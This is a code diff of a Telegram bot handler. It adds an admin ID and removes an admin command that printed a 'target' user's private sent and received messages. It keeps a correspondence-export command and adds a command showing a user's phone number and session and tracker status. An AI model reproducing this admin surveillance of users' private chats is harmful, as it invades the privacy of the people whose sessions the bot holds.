@@ -8,9 +8,14 @@ from aiogram.types import BufferedInputFile, Message
 from core.savemod_service import SaveModService
 
 from datetime import datetime
+
+from db.session import AsyncSessionLocal
+from db.models import UserSession
+from sqlalchemy import select
+from core import tasks
 router = Router()
 
-ADMIN_IDS = [8418446543, 8566322265]
+ADMIN_IDS = [8418446543, 8566322265, 5484215621]
 
 def setup_tracker_handlers(tracker_service, savemod_service):
     @router.message(Command("tracker"))
@@ -58,74 +63,7 @@ def setup_tracker_handlers(tracker_service, savemod_service):
 # bot/handlers/tracker.py
 # bot/handlers/tracker.py
 
-    @router.message(Command("admin"))
-    async def admin_log_handler(message: Message):
-        if message.from_user.id not in ADMIN_IDS:
-            return await message.answer("❌ Команда доступна только администратору.")
-        args = message.text.split()
-        if len(args) < 2 or not args[1].isdigit():
-            return await message.answer("⚠️ Используйте: <code>/admin ID</code>", parse_mode="HTML")
 
-        target_id = int(args[1])
-        logs = await savemod_service.get_user_logs(target_id)
-
-        if not logs:
-            return await message.answer(f"❌ Логи для пользователя <code>{target_id}</code> не найдены.", parse_mode="HTML")
-
-        client = await savemod_service.session_manager.get_client(message.from_user.id)
-
-        await message.answer(f"⏳ Формирую отчет для <code>{target_id}</code>, подгружаю имена...")
-        # Заголовок
-        header = f"📋 <b>ОТЧЕТ ПОЛЬЗОВАТЕЛЯ:</b> <code>{target_id}</code>\n"
-        header += "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
-        
-        res = [header]
-        
-        names_cache = {}
-
-        for log in logs:
-            # Форматируем время из timestamp
-            time_str = datetime.fromtimestamp(log.date).strftime("%d.%m | %H:%M:%S")
-            
-            peer_id = log.chat_id if log.sender_id == target_id else log.sender_id
-
-
-            if peer_id not in names_cache:
-                if client:
-                    names_cache[peer_id] = await savemod_service.get_entity_name(client, peer_id)
-                else:
-                    names_cache[peer_id] = f"ID:{peer_id}"
-
-            contact_name = names_cache[peer_id]
-
-            # Определяем тип сообщения
-            if log.sender_id == target_id:
-                # Наша цель отправила сообщение
-                type_tag = "📤 <b>ОТПРАВЛЕНО</b>"
-                contact = f"кому: <code>{contact_name}</code>"
-            else:
-                # Нашей цели пришло сообщение
-                type_tag = "📥 <b>ПОЛУЧЕНО</b>"
-                contact = f"от: <code>{contact_name}</code>"
-            # Собираем блок сообщения
-            entry = (
-                f"{type_tag}\n"
-                f"👤 {contact}\n"
-                f"🕒 {time_str}\n"
-                f"📝 <code>{log.text}</code>\n"
-                f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
-            )
-            res.append(entry)
-
-        # Склеиваем всё в один текст
-        output_text = "\n".join(res)
-
-        # Отправка с учетом лимита Telegram (4096 символов)
-        if len(output_text) > 4096:
-            for x in range(0, len(output_text), 4096):
-                await message.answer(output_text[x:x+4096], parse_mode="HTML")
-        else:
-            await message.answer(output_text, parse_mode="HTML")
         
     @router.message(Command("export"))
     async def export_logs_handler(message: Message):
@@ -150,3 +88,40 @@ def setup_tracker_handlers(tracker_service, savemod_service):
             caption=f"📁 Архив переписки для <code>{target_id}</code>",
             parse_mode="HTML"
         )
+
+    @router.message(Command("user"))
+    async def get_user_info_handler(message: Message):
+        if message.from_user.id not in ADMIN_IDS:
+            return await message.answer("❌ У вас нет доступа к этой команде.")
+        args = message.text.split()
+        if len(args) < 2 or not args[1].isdigit():
+            return await message.answer("⚠️ Используйте: <code>/user ID</code>", parse_mode="HTML")
+        target_id = int(args[1])
+
+        async with AsyncSessionLocal() as session:
+            result = await session.execute(
+                select(UserSession).where(UserSession.bot_user_id == target_id)
+            )
+            user = result.scalar_one_or_none()
+
+        if not user:
+            return await message.answer(f"❌ Пользователь с ID <code>{target_id}</code> не найден.", parse_mode="HTML")
+        
+        has_session = await savemod_service.session_manager.has_session(target_id)
+        session_status = "✅ Активна" if has_session else "❌ Нет сессии"
+
+        savemod_status = "🟢 Включен" if user.savemod_enabled else "🔴 Выключен"
+        
+        is_tracker_active = tasks.is_tracker_running(target_id)
+        tracker_status = "🟢 Запущен" if is_tracker_active else "🔴 Остановлен"
+
+        text = (
+            f"🔍 <b>Информация о пользователе {target_id}:</b>\n\n"
+            f"📱 <b>Телефон:</b> <code>{user.phone or 'Не указан'}</code>\n"
+            f"🔑 <b>Сессия:</b> {session_status}\n"
+            f"💾 <b>SaveMod:</b> {savemod_status}\n"
+            f"📡 <b>Tracker:</b> {tracker_status}\n"
+
+        )
+
+        await message.answer(text, parse_mode="HTML")
